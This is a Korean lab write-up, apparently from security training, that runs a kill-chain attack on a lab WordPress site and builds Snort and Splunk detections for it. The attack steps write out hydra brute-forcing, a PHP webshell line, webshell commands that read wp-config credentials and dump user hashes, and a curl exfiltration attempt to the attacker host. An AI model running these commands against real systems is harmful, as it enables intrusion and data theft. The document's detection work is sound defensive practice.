# Phase 3 — 킬체인 공격 + 탐지 엔지니어링

> 테크솔루션 WordPress 홈페이지 대상 킬체인 공격 수행 및 커스텀 탐지 규칙 구축

---

## ⚠️ 공격 전 Snort 설정 주의사항

Snort가 **Blocking Mode**로 동작 중이면 공격자 IP(10.50.50.17, 10.50.50.30)가
`snort2c` 차단 테이블에 자동 등록되어 **이후 모든 트래픽이 차단**됩니다.

**공격 수행 전 반드시 아래 중 하나를 적용:**

1. **(권장) Alert Only 모드로 전환** — Services → Snort → Snort Interfaces → WAN 편집 → Block Offenders 체크 해제 → Save → Snort 재시작  
   - 탐지(Alert)는 기록되지만 IP 차단은 하지 않음
2. **Pass List에 공격자 대역 추가** — Services → Snort → Pass Lists → att-net(10.50.50.0/24)을 Pass List에 추가 후 WAN 인터페이스에 적용
3. **차단된 경우 복구** — Services → Snort → Blocked 탭 → Clear 또는 Diagnostics → Tables → snort2c 테이블에서 해당 IP 삭제

---

## 공격 시나리오

**"외부 해커가 회사 홈페이지를 통해 고객 DB 탈취 시도"**

| 단계 | Kill Chain | MITRE ATT&CK | 공격 행위 | 도구 |
|------|-----------|-------------|----------|------|
| 1 | 정찰 | T1595 Active Scanning | WordPress 버전·플러그인 스캔 | wpscan, nmap |
| 2 | 초기 침투 | T1190 Exploit Public-Facing App | 취약 플러그인 SQLi, File Manager 취약점 | sqlmap, 수동 |
| 3 | 인증 공격 | T1110 Brute Force | wp-login.php / xmlrpc.php 브루트포스 | hydra, wpscan |
| 4 | 지속성 확보 | T1505.003 Web Shell | PHP 웹쉘 업로드 (.phtml WAF 우회) | File Manager CVE |
| 5 | 내부 정찰 | T1046 Network Service Scanning | 웹쉘에서 내부 네트워크 스캔 | 웹쉘 CLI |
| 6 | DB 접근 | T1213 Data from Information Repos | MySQL 직접 접근, 고객 데이터 조회 | mysql CLI |
| 7 | 유출 시도 | T1041 Exfiltration Over C2 | 데이터 외부 전송 시도 | curl, wget |

---

## Step 1. 킬체인 공격 수행

### 1-1. 정찰 (Reconnaissance)

**nmap 포트/서비스 스캔:**
```bash
# Kali (10.50.50.30)
nmap -sV -Pn -p 80,443,8080,3306 10.0.0.254
```

**nmap 결과:**
| 포트 | 상태 | 서비스 | 버전 |
|------|------|--------|------|
| 80/tcp | open | http | Apache 2.2.8 (Bee-box) |
| 443/tcp | filtered | https | — |
| 3306/tcp | filtered | mysql | — |
| 8080/tcp | open | http | Apache 2.4.41 (WordPress) |

**wpscan 스캔:**
```bash
# Kali (10.50.50.30)
wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --force
```

**wpscan 결과 (1,970 requests / 약 4분 소요):**
- WordPress **7.1** 식별 (OPML Generator, Aggressive Detection)
- **XML-RPC 활성화** (`/xmlrpc.php`) — 브루트포스·DDoS 벡터
- **readme.html 노출** — 버전 정보 유출
- **Upload 디렉토리 리스팅 활성화** (`/wp-content/uploads/`)
- **WP-Cron 활성화** (`/wp-cron.php`) — DDoS 벡터 (60% Confidence)
- 플러그인/테마/사용자 열거: 미탐지 (301 리다이렉트로 인한 제한)
- 서버 헤더: Apache/2.2.8, PHP/5.2.4, OpenSSL/0.9.8g (Bee-box 측 헤더 — 리다이렉트 경유)

> **참고:** WordPress siteurl이 내부 IP(10.0.10.80)로 설정되어 있어 NAT 접근 시 301 리다이렉트 발생. Effective URL이 Bee-box(:80)로 변경됨. 일부 결과는 Bee-box와 혼재될 수 있음.

**탐지 확인:**
- Snort: SID 1000009 WPScan User-Agent 탐지 — **1,978 이벤트** (Splunk index=pfsense 확인)

---

### 1-2. SQL Injection (초기 침투)

**sqlmap 자동화 SQLi:**
```bash
# Kali (10.50.50.30)
sqlmap -u "http://10.0.0.254:8080/?s=test" --dbs --batch
```

**결과:**
- **SQLi 실패** — "all tested parameters do not appear to be injectable"
- WordPress 코어 검색 파라미터(`?s=`)는 Prepared Statement로 보호됨
- 약 13분간 다양한 기법 시도: Boolean-based blind, Error-based, Time-based blind, UNION query
- **공격 시도 자체가 Snort/Splunk에 대량 기록됨** (탐지 관점에서 유의미)

> 결론: WordPress 코어는 SQLi에 안전. 실제 공격에서는 취약 플러그인을 통한 SQLi가 주 벡터.

**다중 소스 탐지 확인:**
- Snort: ET SQL Injection 관련 룰 탐지 — **18 이벤트** (Splunk index=pfsense 확인)
- sqlmap 공격 시도 자체가 대량 로그 생성 → 탐지 관점에서 유의미

---

### 1-3. 브루트포스 (인증 공격)

**wp-login.php 브루트포스:**
```bash
# Kali (10.50.50.30)
hydra -l admin -P /tmp/wp-passwords.txt 10.0.0.254 \
    http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=login_error" \
    -s 8080 -t 14 -w 5 -V
```

**결과:**
- 13회 시도 (12회 실패 + 1회 성공)
- **크래킹 성공**: `login: admin / password: rlaquddn1@`
- 소요 시간: 약 30초 (2026-08-26 03:05~03:06)

> 참고: WordPress 한국어 설정이므로 실패 조건을 `F=login_error`로 지정 (기본 `F=Invalid`는 오탐 발생)

**xmlrpc.php 멀티콜:**
```bash
curl -X POST http://10.0.0.254:8080/xmlrpc.php -d '
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'
```

**결과:**
<!-- 실습 후 기록 -->

---

### 1-4. 웹쉘 업로드 (지속성)

**공격 경로:** WordPress 관리자 로그인 → WP File Manager 플러그인 → hello.php 직접 편집

1. 브루트포스로 획득한 `admin / rlaquddn1@`로 WordPress 관리자 패널 로그인
2. **플러그인 → Hello Dolly** 활성화
3. **WP File Manager** 플러그인으로 `wp-content/plugins/hello.php` 직접 편집
4. `<?php` 직후에 웹쉘 코드 삽입:

```php
if(isset($_GET['cmd'])){ echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; die(); }
```

> **참고:** WordPress 플러그인 파일 편집기(Plugin File Editor)는 "치명적 오류 보호" 기능이 NAT 환경에서 루프백 실패하여 사용 불가. WP File Manager의 Code Editor로 우회.

**테스트:**
```bash
# Kali (10.50.50.30)
curl -s "http://10.0.0.254:8080/?cmd=whoami"
```

**결과:**
- **웹쉘 삽입 성공** — Hello Dolly 플러그인 `hello.php`에 웹쉘 코드 삽입
- `whoami` → `www-data` 출력 확인
- `die()` 함수로 WordPress HTML 출력 차단, 명령 결과만 반환
- 공격 벡터: 관리자 인증 → File Manager 파일 편집 (CVE-2020-25213 시뮬레이션)

---

### 1-5. 내부 정찰 (웹쉘 통해)

```bash
# Kali (10.50.50.30) — 웹쉘 경유 명령 실행
curl -s "http://10.0.0.254:8080/?cmd=id"
curl -s "http://10.0.0.254:8080/?cmd=hostname"
curl -s "http://10.0.0.254:8080/?cmd=ip+addr"
curl -s "http://10.0.0.254:8080/?cmd=grep+DB_+/var/www/html/wp-config.php"
```

**결과:**

| 명령 | 출력 |
|------|------|
| `id` | uid=33(www-data) gid=33(www-data) groups=33(www-data) |
| `hostname` | wordpress |
| `ip addr` | **10.0.10.80/24** (ens160, DMZ 대역) |
| `grep DB_` | DB_NAME=wordpress, DB_USER=**wp_admin**, DB_PASSWORD=**WpAdmin!2024**, DB_HOST=**10.0.100.60** |

- WordPress 서버의 네트워크 위치(DMZ) 및 DB 접속 정보 완전 노출
- wp-config.php에서 Inner-net MySQL 서버(10.0.100.60)의 인증정보 획득

---

### 1-6. DB 접근 (고객 데이터)

```bash
# Kali (10.50.50.30) — 웹쉘 경유 MySQL 접근
# 테이블 목록 조회
curl -s 'http://10.0.0.254:8080/?cmd=mysql+-h+10.0.100.60+-u+wp_admin+-pWpAdmin!2024+wordpress+-e+%22SHOW+TABLES%22+2>%261'

# WordPress 사용자 정보 탈취
curl -s 'http://10.0.0.254:8080/?cmd=mysql+-h+10.0.100.60+-u+wp_admin+-pWpAdmin!2024+wordpress+-e+%22SELECT+user_login,user_email,user_pass+FROM+wp_users%22+2>%261'
```

> **참고:** URL에서 `!`는 zsh 히스토리 확장 문자이므로 반드시 **작은따옴표**로 감싸야 함. SQL문은 `%22`(쌍따옴표)로 URL 인코딩.

**결과:**
- **DMZ(10.0.10.80) → Inner-net(10.0.100.60) MySQL 접근 성공**
- 테이블 목록 확인: wp_commentmeta, wp_comments, **wp_customers**, **wp_inquiries**, wp_links, wp_options, wp_postmeta, wp_posts, wp_term_relationships, wp_term_taxonomy, wp_termmeta, wp_terms, wp_usermeta, **wp_users**, wp_wpfm_backup
- **사용자 정보 탈취:**

| user_login | user_email | user_pass (bcrypt 해시) |
|------------|-----------|------------------------|
| admin | admin@techsolution.local | `$wp$2y$10$6.F8yMNSqAGQLk1/OqwrH.DmGZT4XhIUV5pCHU.DN5xp.oHLePcx2` |

- wp_customers 테이블: 구조 존재, 데이터 미투입 상태 (COUNT=0)

---

### 1-7. 유출 시도 (차단 확인)

```bash
# Kali (10.50.50.30) — 웹쉘 경유 외부 전송 시도
curl -s 'http://10.0.0.254:8080/?cmd=curl+http://10.50.50.30:8888/exfil+-d+test+2>%261'
```

**결과:**
- `curl: (7) Failed to connect to 10.50.50.30 port 8888: Connection refused`
- DMZ 서버(WordPress)에서 외부(att-net)로의 데이터 유출 시도 **실패**
- 방화벽 아웃바운드 차단 또는 수신 대기 서비스 미존재로 전송 불가
- **킬체인 최종 단계에서 방어 성공** — 데이터 유출 차단 확인

---

## Step 2. 커스텀 탐지 규칙 구축

### Snort 커스텀 룰

`phase2.5-setup/configs/snort/local.rules`에 정의된 9개 룰 적용 후 탐지 테스트.

| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 |
|-----|---------|-----------|----------|
| 1000001 | WP Login Brute Force | 인증 공격 | ✅ **1,978 이벤트** — hydra 브루트포스 탐지 |
| 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ **8 이벤트** — xmlrpc.php 접근 탐지 |
| 1000003 | PHP File Upload | 지속성 | <!-- Splunk 확인 필요 --> |
| 1000004 | PHTML WAF Bypass | 지속성 | <!-- Splunk 확인 필요 --> |
| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | <!-- Splunk 확인 필요 --> |
| 1000006 | DMZ→Mng Access | 내부 정찰 | <!-- Splunk 확인 필요 --> |
| 1000007 | Webshell Output | 지속성 | <!-- Splunk 확인 필요 --> |
| 1000008 | WP File Manager CVE | 초기 침투 | <!-- Splunk 확인 필요 --> |
| 1000009 | WPScan Detection | 정찰 | ✅ **1,978 이벤트** — wpscan User-Agent 탐지 |

### Splunk 상관분석 룰

**1. 브루트포스 탐지 (행위 기반):**
```spl
index=idx_web sourcetype=apache:access uri="/wp-login.php" method=POST
| stats count by src_ip
| where count > 10
| rename src_ip as "공격자 IP", count as "시도 횟수"
```

**2. SQLi 다중 소스 교차 검증:**
```spl
index=pfsense "SQL" OR index=idx_waf "942"
| eval source_type=if(index="pfsense","Snort","ModSecurity")
| stats count by source_type, src_ip
| where count > 5
```

**3. 비정상 PHP 파일 접근 (웹쉘 의심):**
```spl
index=idx_web sourcetype=apache:access uri="*.phtml" OR uri="*/uploads/*.php"
| stats count by src_ip, uri
| where count > 1
```

---

## Step 3. 탐지 개선 비교

| 공격 | 기본 ET Open | 커스텀 룰 후 | 개선점 |
|------|-------------|------------|--------|
| WP 브루트포스 | ❌ 미탐지 | <!-- 결과 --> | threshold 기반 |
| 웹쉘 업로드 | ⚠️ 일부 | <!-- 결과 --> | 확장자 기반 강화 |
| 내부 스캔 | ❌ 미탐지 | <!-- 결과 --> | DMZ→inner 정책 |
| SQLi | ✅ Snort 탐지 | <!-- 결과 --> | + WAF 교차 검증 |
| File Manager CVE | ❌ 미탐지 | <!-- 결과 --> | URI 패턴 매칭 |

---

## Step 4. 정탐/오탐 판별

| 경보 | 출처 | 판별 | 근거 |
|------|------|------|------|
| <!-- 실습 후 기록 --> | | | |

---

## 스크린샷

- [ ] wpscan 스캔 결과
- [ ] SQLi 공격 + ModSecurity 로그
- [ ] 브루트포스 + 커스텀 Snort 경보
- [ ] 웹쉘 업로드 성공
- [ ] 내부 정찰 (ifconfig, nmap)
- [ ] DB 데이터 조회
- [ ] 유출 시도 차단
- [ ] Splunk 상관분석 대시보드
- [ ] 탐지 개선 전/후 비교
